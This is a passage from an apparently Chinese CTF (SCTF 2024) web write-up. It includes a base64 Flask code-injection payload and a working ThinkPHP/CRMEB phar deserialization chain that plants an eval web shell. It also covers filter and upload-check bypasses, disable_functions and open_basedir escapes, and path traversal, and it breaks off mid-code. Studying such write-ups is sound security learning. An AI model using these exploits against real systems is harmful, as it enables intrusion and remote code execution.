class="hljs-name">&quot;import+base64;ex&quot;</span>%<span class="hljs-number">2</span>b<span class="hljs-string">&quot;ec(base64.b64decode(&#x27;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp&#x27;));&quot;</span>)&#125;&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005233349472.png" alt="image-20241005233349472"></p><h2 id="Simpleshop"><a href="#Simpleshop" class="headerlink" title="Simpleshop"></a>Simpleshop</h2><p>看了一半没看到。</p><p>看了他的letter，注册了个号，修改头像处存在文件上传，但是直接传不行，ban完了。</p><p>下载源码发现ThinkPHP框架，并且找到个未公开的CVE打这个CRMEB的反序列化，挖洞没跑了。</p><p>想办法打phar吧。</p><p>漏洞点在<code>CRMEB-5.4.0\CRMEB-5.4.0\crmeb\app\adminapi\controller</code>的<code>PublicController</code>类中。</p><p>网上找ThinkPHP的反序列化链，有现成的，直接套过来用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PhpOffice</span>\<span class="hljs-title class_">PhpSpreadsheet</span>\<span class="hljs-title class_">Collection</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Cells</span>&#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">cache</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cache = <span class="hljs-variable">$exp</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Channel</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">logger</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lazy</span> = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$exp</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;lazy = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">url</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;url = <span class="hljs-string">&#x27;&lt;?php file_put_contents(&quot;/var/www/public/uploads/store/comment/20240929/fpclose.php&quot;, \&#x27;&lt;?php eval($_POST[1]); ?&gt;\&#x27;, FILE_APPEND); ?&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$instances</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;instances = [<span class="hljs-string">&#x27;think\Request&#x27;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">view</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Php</span>&#123;&#125;<br>&#125;<br><br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Socket</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">config</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;config = [<br>                <span class="hljs-string">&#x27;debug&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;force_client_ids&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&#x27;allow_client_ids&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;format_head&#x27;</span> =&gt; [<span class="hljs-keyword">new</span> \think\view\driver\Php,<span class="hljs-string">&#x27;display&#x27;</span>],<br>            ];<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> \think\<span class="hljs-title function_ invoke__">App</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title class_">c</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Socket</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> think\log\<span class="hljs-title function_ invoke__">Channel</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhpOffice\PhpSpreadsheet\Collection\Cells</span>(<span class="hljs-variable">$b</span>);<br><br><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;phar.readonly&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;fpclose.jpg&quot;</span>, <span class="hljs-string">&quot;666&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>phar://</code>被ban了，这个看了源码发现其实是直接被替换为空，双写就能绕过。</p><p>文件直接套一个gzip来绕上传内容检测。先改名1.jpg然后gzip 1.jpg。</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005233834211.png" alt="image-20241005233834211"></p><p>蚁剑直连，用一下fpm插件绕过disable_functions。</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005233935015.png" alt="image-20241005233935015"></p><p>然后里面一个suid-grep提权交了。</p><p>这里翻网上wp发现星盟还真nb，写了个跳板php，然后打iconv来getshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005234147752.png" alt="image-20241005234147752"></p><p>这也能想到啊，我草。</p><p>学到一个新的绕disable_functions方法了。</p><h2 id="SycServer2-0"><a href="#SycServer2-0" class="headerlink" title="SycServer2.0"></a>SycServer2.0</h2><p>怪题，出晚了。</p><p>前端绕过很简单，js的waf形同虚设，删了直接sql万能密码进了，拿cookie。</p><p>robots.txt发现一个玩意：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-agent: *<br>Disallow:<br>Disallow: /ExP0rtApi?v=<span class="hljs-built_in">static</span>&amp;f=<span class="hljs-number">1</span>.jpeg<br></code></pre></td></tr></table></figure><p>猜测这是一个读取文件的接口，结果还真是，替换<code>../</code>为空，双写绕了。</p><p>然后就可以读到app.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> nodeRsa = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-rsa&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SECRET_KEY</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;zlib&#x27;</span>);<br><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>)<br><span class="hljs-keyword">const</span> handle = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./handle&#x27;</span>);<br><span class="hljs-keyword">const</span> cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> con = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;ctf123123&#x27;</span>,<br>  <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;sctf&#x27;</span><br>&#125;)<br>con.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="hljs-property">message</span>);<br>    <span class="hljs-built_in">setTimeout</span>(con.<span class="hljs-title function_">connect</span>(), <span class="hljs-number">2000</span>); <span class="hljs-comment">// 2ç§åéè¯è¿æ¥</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL&#x27;</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> &#123;response&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> req = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express/lib/request&quot;</span>);<br><br><span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(&#123; <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span> &#125;);<br>key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span> &#125;);<br><br><span class="hljs-keyword">var</span> publicPem = <span class="hljs-string">`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`</span>;<br><span class="hljs-keyword">var</span> privatePem = <span class="hljs-string">`-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span><br><span class="hljs-string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span><br><span class="hljs-string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span><br><span class="hljs-string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span><br><span class="hljs-string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span><br><span class="hljs-string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span><br><span class="hljs-string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span><br><span class="hljs-string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span><br><span class="hljs-string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span><br><span class="hljs-string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span><br><span class="hljs-string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span><br><span class="hljs-string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span><br><span class="hljs-string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span><br><span class="hljs-string">xu/vfQ0A1jHRNC7t</span><br><span class="hljs-string">-----END PRIVATE KEY-----`</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;static&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Reportcache</span> = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyAdmin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>[<span class="hljs-string">&#x27;auth_token&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!token) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;No token provided&#x27;</span> &#125;);<br>  &#125;<br><br>  jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">SECRET_KEY</span>, <span class="hljs-function">(<span class="hljs-params">err, decoded</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Failed to authenticate token&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">role</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);<br>    &#125;<br><br>    req.<span class="hljs-property">user</span> = decoded;<br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/config&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">json</span>(&#123;<br>    <span class="hljs-attr">publicKey</span>: publicPem,<br>  &#125;);<br>&#125;);<br><br><span class="hljs-keyword">var</span> decrypt = <span class="hljs-keyword">function</span>(<span class="hljs-params">body</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> pem = privatePem;<br>    <span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(pem, &#123;<br>      <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span>,<br>      <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span><br>    &#125;);<br>    key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">environment</span>: <span class="hljs-string">&quot;browser&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span> key.<span class="hljs-title function_">decrypt</span>(body, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;decrypt error&quot;</span>, e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> encryptedPassword = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    passwd = <span class="hljs-title function_">decrypt</span>(encryptedPassword)<br>    <span class="hljs-keyword">if</span>(username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">const</span> sql = <span class="hljs-string">`select (select password from user where username = &#x27;admin&#x27;) = &#x27;<span 